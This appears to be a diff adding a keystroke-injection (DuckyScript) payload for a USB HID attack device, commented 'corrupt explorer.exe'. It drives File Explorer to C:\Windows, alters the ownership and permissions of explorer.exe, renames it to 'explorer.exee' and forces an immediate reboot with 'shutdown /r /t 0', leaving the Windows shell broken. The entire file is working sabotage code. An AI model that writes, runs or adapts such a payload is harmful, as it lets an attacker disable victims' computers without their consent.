@@ -1,0 +1,139 @@
+    DELAY 8000
+    REM corrupt explorer.exe
+    GUI e
+    DELAY 800
+    ALT v
+    DELAY 600
+    ALT hf
+    DELAY 800
+    ALT d
+    DELAY 700
+    STRING C:\Windows
+    DELAY 600
+    ENTER
+    DELAY 600
+    STRING e
+    DELAY 600
+    STRING e
+    DELAY 600
+    ALT ENTER
+    DELAY 500
+    TAB
+    DELAY 500
+    TAB
+    DELAY 500
+    TAB
+    DELAY 500
+    TAB
+    DELAY 500
+    TAB
+    DELAY 500
+    RIGHTARROW
+    DELAY 500
+    RIGHTARROW
+    DELAY 600
+    ALT v
+    DELAY 800
+    ALT c
+    DELAY 800
+    ALT f
+    DELAY 700
+    CONTROL C
+    DELAY 700
+    ALT e
+    DELAY 650
+    CONTROL V
+    DELAY 500
+    STRING \Users
+    DELAY 600
+    ENTER
+    DELAY 600
+    ALT A
+    DELAY 900
+    ENTER
+    DELAY 800
+    ENTER
+    DELAY 600
+    TAB
+    DELAY 500
+    ENTER
+    DELAY 700
+    ALT ENTER
+    DELAY 500
+    TAB
+    DELAY 500
+    TAB
+    DELAY 500
+    TAB
+    DELAY 500
+    TAB
+    DELAY 500
+    TAB
+    DELAY 600
+    RIGHTARROW
+    DELAY 600
+    RIGHTARROW
+    DELAY 600
+    ALT E
+    DELAY 600
+    DOWNARROW
+    DELAY 600
+    DOWNARROW
+    DELAY 600
+    DOWNARROW
+    DELAY 600
+    DOWNARROW
+    DELAY 500
+    TAB
+    DELAY 500
+    TAB
+    DELAY 500
+    TAB
+    DELAY 700
+    SPACE
+    DELAY 500
+    ENTER
+    DELAY 800
+    ALT Y
+    DELAY 600
+    ENTER
+    DELAY 600
+    TAB
+    DELAY 500
+    ENTER
+    DELAY 700
+    ALT ENTER
+    DELAY 850
+    TAB
+    DELAY 500
+    TAB
+    DELAY 500
+    TAB
+    DELAY 600
+    TAB
+    DELAY 600
+    TAB
+    DELAY 800
+    TAB
+    DELAY 600
+    STRING explorer.exee
+    DELAY 950
+    ENTER
+    DELAY 600
+    ENTER
+    DELAY 600
+    ENTER
+    DELAY 900
+    LEFTARROW
+    DELAY 600
+    ENTER
+    DELAY 800
+    GUI r
+    DELAY 550
+    STRING cmd
+    DELAY 600
+    ENTER
+    DELAY 800
+    STRING shutdown /r /t 0
+    DELAY 700
+    ENTER
